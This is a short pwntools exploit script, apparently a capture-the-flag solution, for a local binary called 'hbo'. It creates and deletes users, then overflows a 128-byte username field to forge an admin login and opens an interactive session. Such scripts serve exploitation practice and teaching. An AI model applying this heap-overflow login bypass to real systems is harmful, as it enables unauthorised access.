#!/bin/python

from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']

io = gdb.debug('./hbo', gdbscript = '''
    b main
    c
        ''')

p = log.progress("Status");

p.status("Creating first user");
io.recvuntil(b'> ');
io.sendline(b'1');           # register new user

io.recvuntil(b'> ');
io.sendline(b'A');           # username

io.recvuntil(b'> ');
io.sendline(b'A');           # password

p.status("Creating second user");
io.recvuntil(b'> ');
io.sendline(b'1');           # register new user

io.recvuntil(b'> ');
io.sendline(b'B');           # username

io.recvuntil(b'> ');
io.sendline(b'B');           # password

p.status("Deleting first user");
io.recvuntil(b'> ');
io.sendline(b'2');           # login

io.recvuntil(b'> ');
io.sendline(b'A');           # username

io.recvuntil(b'> ');
io.sendline(b'A');           # password

io.recvuntil(b'> ');
io.sendline(b'4');           # delete

p.status("Creating user with looooooooooooooooong name");
io.recvuntil(b'> ');
io.sendline(b'1');           # create new user

io.recvuntil(b'> ');
io.sendline(b'A' * 128);     # username

io.recvuntil(b'> ');
io.sendline(b'A');          # password

p.status("Logging in as admin");
io.recvuntil(b'> ');
io.sendline(b'2');          # login

io.recvuntil(b'> ');        # username
io.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' + b'A' * 48);

io.recvuntil(b'> ')         # password
io.sendline(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

io.interactive()
